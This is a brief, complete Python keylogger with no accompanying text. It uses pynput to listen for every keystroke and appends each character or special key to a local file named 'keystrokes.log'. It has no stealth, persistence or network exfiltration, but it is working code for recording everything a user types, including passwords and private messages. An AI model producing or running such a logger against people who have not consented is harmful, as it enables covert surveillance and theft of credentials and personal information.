from pynput import keyboard

log_file = "keystrokes.log"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()